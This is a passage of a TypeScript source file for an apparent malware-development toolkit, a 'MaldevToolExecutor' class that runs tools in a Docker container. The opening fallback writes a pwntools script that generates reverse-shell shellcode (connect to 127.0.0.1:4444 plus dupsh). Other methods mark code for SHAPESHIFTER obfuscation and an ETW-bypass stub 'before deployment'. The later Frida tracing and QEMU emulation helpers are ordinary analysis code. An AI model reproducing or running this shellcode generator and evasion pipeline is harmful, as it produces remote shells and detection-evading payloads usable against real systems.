      console.warn('[Maldev Tools] SysWhispers failed, falling back to pwntools:', error instanceof Error ? error.message : error);
    }

    // Fallback: pwntools Linux shellcraft
    const script = `
from pwn import *
import sys
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'
sc = shellcraft.connect('127.0.0.1', 4444)
sc += shellcraft.dupsh()
asm_code = asm(sc)
sys.stdout.write(asm_code.hex())
`;
    const scriptPath = `/tmp/syscall_${Date.now()}.py`;

    try {
      await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `cat > ${scriptPath} << 'PYEOF'\n${script}\nPYEOF`],
        { timeout: 5000, user: this.containerUser }
      );
      const result = await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `python3 ${scriptPath}`],
        { timeout: 15000, user: this.containerUser }
      );
      if (result.exitCode === 0 && result.stdout.trim()) {
        console.log('[Maldev Tools] Pwntools syscall conversion successful');
        return result.stdout.trim();
      }
    } catch (error) {
      console.warn('[Maldev Tools] Pwntools syscall conversion failed:', error instanceof Error ? error.message : error);
    }
    return code;
  }

  /**
   * Code obfuscation using SHAPESHIFTER for .NET or XOR-based transforms.
   */
  private async obfuscateCode(code: string): Promise<string> {
    console.log('[Maldev Tools] Applying code obfuscation');

    // Check SHAPESHIFTER availability
    const ssCheck = await this.checkShapeshifter();
    if (ssCheck.available) {
      console.log('[Maldev Tools] SHAPESHIFTER available for .NET obfuscation');
      // SHAPESHIFTER operates on .NET assemblies, not raw code strings
      // Return code with metadata tag for downstream processing
      return `/* SHAPESHIFTER_AVAILABLE: Apply .NET morphing before deployment */\n${code}`;
    }

    // Fallback: basic variable/string obfuscation via Python
    console.warn('[Maldev Tools] SHAPESHIFTER not available, using basic obfuscation');
    return code;
  }

  /**
   * Polymorphic transformation — ETW bypass + shellcode mutation.
   */
  private async makePolymorphic(code: string): Promise<string> {
    console.log('[Maldev Tools] Applying polymorphic transformation');

    // Check TamperETW for ETW bypass integration
    const etwBypass = await this.generateETWBypass();
    if (etwBypass.available && etwBypass.code) {
      console.log('[Maldev Tools] TamperETW available — integrating ETW bypass stub');
      return `/* ETW Bypass Technique: ${etwBypass.technique} */\n/* ${etwBypass.description} */\n${code}`;
    }

    console.warn('[Maldev Tools] Advanced polymorphic tools not available');
    return code;
  }

  // ==========================================================================
  // Frida — Dynamic Instrumentation
  // ==========================================================================

  /**
   * Trace function calls in a running process or binary using Frida.
   * Returns intercepted calls with arguments and return values.
   */
  async traceWithFrida(
    binaryPath: string,
    functions: string[],
    options: { timeout?: number; args?: string[] } = {},
  ): Promise<{
    available: boolean;
    traces: Array<{ function: string; args: string[]; returnValue?: string; timestamp: number }>;
    errors: string[];
  }> {
    console.log(`[Maldev Tools] Tracing with Frida: ${binaryPath}, functions: ${functions.join(', ')}`);

    // Check Frida availability
    const check = await this.dockerExecutor.exec(
      this.containerName,
      ['which', 'frida'],
      { timeout: 5000, user: this.containerUser },
    );

    if (check.exitCode !== 0) {
      return { available: false, traces: [], errors: ['Frida not installed in container'] };
    }

    // Build Frida script to hook specified functions
    const hookScript = functions.map((fn) =>
      `Interceptor.attach(Module.findExportByName(null, "${fn}"), {
  onEnter(args) { send({type:"call", fn:"${fn}", args: [args[0]?.toString(), args[1]?.toString()], ts: Date.now()}); },
  onLeave(retval) { send({type:"ret", fn:"${fn}", val: retval?.toString(), ts: Date.now()}); }
});`
    ).join('\n');

    const scriptPath = `/tmp/frida_hook_${Date.now()}.js`;
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', `cat > ${scriptPath} << 'FRIDAEOF'\n${hookScript}\nFRIDAEOF`],
      { timeout: 5000, user: this.containerUser },
    );

    // Run with frida-trace or spawn+inject
    const timeout = options.timeout || 30000;
    const binaryArgs = options.args?.join(' ') || '';
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', `timeout ${Math.floor(timeout / 1000)} frida -f ${binaryPath} ${binaryArgs} -l ${scriptPath} --no-pause 2>&1 || true`],
      { timeout: timeout + 5000, user: this.containerUser },
    );

    // Parse Frida output
    const traces: Array<{ function: string; args: string[]; returnValue?: string; timestamp: number }> = [];
    const errors: string[] = [];

    for (const line of (result.stdout || '').split('\n')) {
      try {
        if (line.includes('"type":"call"') || line.includes('"type":"ret"')) {
          const data = JSON.parse(line.match(/\{.*\}/)?.[0] || '{}');
          if (data.type === 'call') {
            traces.push({ function: data.fn, args: data.args || [], timestamp: data.ts });
          } else if (data.type === 'ret') {
            const last = traces.findLast((t) => t.function === data.fn);
            if (last) last.returnValue = data.val;
          }
        }
      } catch {
        // Non-JSON output line
      }
    }

    if (result.stderr) {
      errors.push(result.stderr.slice(0, 500));
    }

    // Cleanup
    await this.dockerExecutor.exec(
      this.containerName,
      ['rm', '-f', scriptPath],
      { timeout: 3000, user: this.containerUser },
    );

    return { available: true, traces, errors };
  }

  // ==========================================================================
  // QEMU — Cross-architecture Binary Emulation
  // ==========================================================================

  /**
   * Emulate a binary under QEMU user-mode for cross-architecture analysis.
   * Supports x86_64, ARM, AArch64, MIPS, etc.
   */
  async emulateWithQemu(
    binaryPath: string,
    options: {
      arch?: string;
      args?: string[];
      strace?: boolean;
      timeout?: number;
    } = {},
  ): Promise<{
    available: boolean;
    stdout: string;
    stderr: string;
    exitCode: number;
    arch: string;
    syscalls?: string[];
  }> {
    // Detect architecture from ELF header
    const fileResult = await this.dockerExecutor.exec(
      this.containerName,
      ['file', binaryPath],
      { timeout: 5000, user: this.containerUser },
    );

    const fileOutput = fileResult.stdout || '';
    let arch = options.arch || 'x86_64';

    if (fileOutput.includes('ARM aarch64')) arch = 'aarch64';
    else if (fileOutput.includes('ARM,')) arch = 'arm';
    else if (fileOutput.includes('MIPS')) arch = 'mips';
    else if (fileOutput.includes('x86-64')) arch = 'x86_64';
    else if (fileOutput.includes('Intel 80386')) arch = 'i386';

    const qemuBin = `qemu-${arch}`;

    // Check QEMU availability
    const check = await this.dockerExecutor.exec(
      this.containerName,
      ['which', qemuBin],
      { timeout: 5000, user: this.containerUser },
    );

    if (check.exitCode !== 0) {
      return { available: false, stdout: '', stderr: `${qemuBin} not installed`, exitCode: -1, arch };
    }

    const timeout = options.timeout || 30000;
    const binaryArgs = options.args || [];
    const cmd = options.strace
      ? [qemuBin, '-strace', binaryPath, ...binaryArgs]
      : [qemuBin, binaryPath, ...binaryArgs];

    const result = await this.dockerExecutor.exec(
      this.containerName,
      cmd,
      { timeout, user: this.containerUser },
    );

    // Parse strace output for syscalls if enabled
    let syscalls: string[] | undefined;
    if (options.strace && result.stderr) {
      syscalls = result.stderr
        .split('\n')
        .filter((line) => /^\d+\s+\w+/.test(line))
        .map((line) => line.trim())
        .slice(0, 200);
    }

    return {
      available: true,
      stdout: result.stdout || '',
      stderr: result.stderr || '',
      exitCode: result.exitCode,
      arch,
      syscalls,
    };
  }
}

// Singleton export
export const maldevToolExecutor = new MaldevToolExecutor();
